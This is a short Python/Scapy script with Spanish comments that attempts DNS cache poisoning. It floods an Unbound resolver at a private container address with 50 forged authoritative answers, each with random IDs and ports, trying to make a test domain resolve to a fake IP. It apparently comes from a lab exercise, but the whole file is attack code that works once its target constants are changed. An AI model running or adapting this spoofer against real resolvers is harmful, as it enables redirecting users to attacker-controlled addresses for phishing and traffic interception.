from scapy.all import *
import random
import time

# IP del contenedor Unbound
UNBOUND_IP = "172.20.0.3"
UNBOUND_PORT = 53

# Nombre del dominio falso
DOMAIN = "falso.example.test"

# Dirección IP falsa que el atacante intenta inyectar
FAKE_IP = "6.6.6.6"

# Número de intentos (para aumentar probabilidad de éxito en race)
NUM_ATTEMPTS = 50

print(f"Enviando {NUM_ATTEMPTS} respuestas falsas...")

for _ in range(NUM_ATTEMPTS):
    pkt = IP(dst=UNBOUND_IP)/UDP(dport=UNBOUND_PORT, sport=random.randint(1024, 65535))/DNS(
        id=random.randint(0, 65535),
        qr=1, aa=1, rd=1,
        qd=DNSQR(qname=DOMAIN, qtype="A"),
        an=DNSRR(rrname=DOMAIN, type="A", ttl=60, rdata=FAKE_IP)
    )
    send(pkt, verbose=0)
    time.sleep(0.01)  # Pequeño retardo para el race
